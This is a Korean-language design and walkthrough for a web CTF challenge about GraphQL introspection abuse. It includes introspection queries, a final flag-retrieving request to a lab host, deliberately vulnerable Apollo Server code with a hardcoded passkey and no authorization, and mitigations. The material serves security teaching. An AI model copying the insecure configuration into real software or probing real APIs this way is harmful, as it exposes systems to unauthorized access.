---
title: GraphQL Introspection Abuse & Hidden Query Extraction — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, graphql, introspection, api-recon, security-misconfiguration]
confidence: high
---

# GraphQL Introspection Abuse & Hidden Query Extraction — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Modern Portal API (모던 포털 API 서비스)
- **난이도**: Easy-Medium
- **핵심 컨셉**: 최신 RESTful 아키텍처 대안인 **GraphQL API**의 설정 오류(Security Misconfiguration)를 활용하는 문제입니다. 사용자는 메인 포털에서 상품 목록 등을 조회하며 해당 서비스가 GraphQL 기반으로 구현되어 있음을 인지하게 됩니다. 개발자는 운영 환경에서 내부 API 명세서 노출을 방지하기 위해 일반 문서는 숨겼으나, 스키마의 메타데이터를 질의할 수 있는 **인트로스펙션(Introspection)** 기능을 활성 상태로 방치했습니다. 공격자는 인트로스펙션 쿼리를 날려 비공개된 쿼리 노드와 파라미터 구조를 맵핑하고, 숨겨진 관리자 호출(Mutation)을 찾아 플래그를 취득합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Client Dashboard**: 제품 목록을 GraphQL 비동기 요청(`POST /graphql`)으로 질의하여 리스트를 출력하는 SPA 웹.
- **Backend Service (Node.js/Apollo Server or Python/Graphene)**:
  - 단일 엔드포인트 `/graphql` 운영.
  - 디버그 및 스키마 탐색이 용이하도록 `introspection: true` 설정이 내부적으로 지정되어 있음.
  - 스키마 내에 숨겨진 쿼리 `getSystemFlag(key: String!)` 및 비정상 유저 조회 필드 존재.
- **Flag 위치**:
  - `getSystemFlag` 쿼리에 매핑된 결과 정보.

### 2.2 취약점 지점
1. **GraphQL Introspection Enabled in Production**:
   - 운영 서버임에도 불구하고 스키마 정보를 통째로 조회할 수 있는 내부 쿼리 `__schema` 가용화 상태입니다.
2. **Security by Obscurity (숨김 처리에 의존한 보안)**:
   - 문서나 일반 클라이언트 코드에만 관련 쿼리(`getSystemFlag`) 호출 버튼을 없앴을 뿐, 서버단 인가 제어를 추가하지 않고 단순 이름 숨김에만 의존한 설계 결함입니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 | 비고 |
|------------|--------|------|--------------------|---------|------|
| `/graphql` | POST | 없음 | GraphQL Query 문 (JSON 포맷) | 스키마 데이터 또는 에러 결과 | API 스키마 탐색 및 취약 쿼리 전송 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 인트로스펙션 가능 여부 판별
GraphQL 엔드포인트에 최상위 스키마 구성을 역조회하는 특수 필드(`__schema`)를 질의해 봅니다.
- *요청*:
  ```json
  {
    "query": "{ __schema { types { name } } }"
  }
  ```
- *결과*: 에러 없이 전체 타입명이 리턴된다면 인트로스펙션 취약점을 이용할 수 있는 상태입니다.

### Step 2. 상세 스키마 매핑 (Schema Reconstruction)
보다 상세한 정보를 얻기 위해 각 타입 내 정의된 필드 정보와 인자값 유형을 덤프하는 쿼리를 보냅니다. (또는 `InQL` 이나 Burp GraphQL Raider, GraphQL Voyager 같은 도구 활용)
- **상세 분석용 인트로스펙션 쿼리**:
  ```json
  {
    "query": "query { __schema { queryType { fields { name args { name type { name kindOfType: kind } } } } } }"
  }
  ```
- *반환 결과 분석*:
  ```json
  {
    "data": {
      "__schema": {
        "queryType": {
          "fields": [
            { "name": "allProducts", "args": [] },
            { "name": "getProductById", "args": [...] },
            {
              "name": "getSystemFlag",
              "args": [
                {
                  "name": "passkey",
                  "type": { "name": "String", "kindOfType": "SCALAR" }
                }
              ]
            }
          ]
        }
      }
    }
  }
  ```
  분석 결과, 일반 기능에는 쓰이지 않는 `getSystemFlag(passkey: String!)` 쿼리 노드가 존재하며 인자로 `passkey`를 받음을 포착합니다.

### Step 3. Hidden Mutation / Query 수행을 위한 비밀 매개변수 정보 탐색
더 많은 정보를 얻기 위해 스키마에 정의된 다른 Query 필드 중 힌트가 들어있을 법한 `SystemConfig` 타입을 읽어봅니다. 혹은 인트로스펙션 분석 중 `passkey`에 대입할 만한 기밀 문자열이나 테스트용 기본 패스키(예: `"admin_secret_key"`)를 코드나 메타데이터에서 취득합니다.

### Step 4. 최종 쿼리 질의 및 플래그 획득
공격자는 인스펙션을 통해 얻은 매개변수 형식에 맞추어 플래그 획득용 쿼리를 전송합니다.
- *요청*:
  ```http
  POST /graphql HTTP/1.1
  Host: graphql.challenge.local
  Content-Type: application/json

  {
    "query": "query { getSystemFlag(passkey: \"admin_secret_key\") }"
  }
  ```
- *서버 응답 결과*:
  인가 제어가 부재하여, 올바른 쿼리 구조 전송 시 플래그 텍스트가 정상 노출됩니다.
  ```json
  {
    "data": {
      "getSystemFlag": "FLAG{graphql_introspection_revealed_hidden_apis}"
    }
  }
  ```

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Apollo Server)

```javascript
// server.js (Apollo Server v3 취약 설정 예시)
const { ApolloServer, gql } = require('apollo-server');

const typeDefs = gql`
  type Product {
    id: ID!
    name: String!
    price: Int!
  }

  type Query {
    allProducts: [Product]
    # 비공개로 감춰둔 쿼리
    getSystemFlag(passkey: String!): String
  }
`;

const resolvers = {
  Query: {
    allProducts: () => [
      { id: 1, name: "Secured Wallet", price: 50 },
      { id: 2, name: "Hardware Key", price: 120 }
    ],
    getSystemFlag: (_, { passkey }) => {
      // 쿼리 매개변수 통과 시 플래그 반환
      if (passkey === "admin_secret_key") {
        return "FLAG{graphql_introspection_revealed_hidden_apis}";
      }
      return "Invalid passkey";
    }
  }
};

// 취약점 지점: 운영 환경 배포 시 introspection 및 playground 설정을 활성화로 둠
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: true,  // 외부의 __schema 쿼리 질의를 무제한 허용
  playground: true
});

server.listen(4000).then(({ url }) => {
  console.log(`Server running at ${url}`);
});
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **운영 서버 인트로스펙션 비활성화 (Disable Introspection)**:
   - 프로덕션 배포 시에는 스키마 분석 쿼리(`__schema`, `__type`)가 동작하지 않도록 명시적으로 비활성화합니다.
   - **올바른 예시**:
     ```javascript
     const server = new ApolloServer({
       typeDefs,
       resolvers,
       introspection: false // 개발용 도구 정보 탐색 차단
     });
     ```
2. **심층 권한 제어 (Field-level Authorization)**:
   - 쿼리의 명칭 노출 여부와 관계없이 개별 쿼리/뮤테이션 리졸버 내부에서 호출 주체의 세션 권한(관리자 여부 등)을 명확하게 검증하여 인가(Authorization)를 적용해야 합니다.
3. **쿼리 복잡도 및 깊이 제한 (Query Depth Limiting)**:
   - 클라이언트가 임의의 순환 쿼리나 깊은 깊이의 스키마 분석을 시도하는 공격(DoS 유발)을 막기 위해 쿼리 제한 라이브러리를 연동하여 통제합니다.
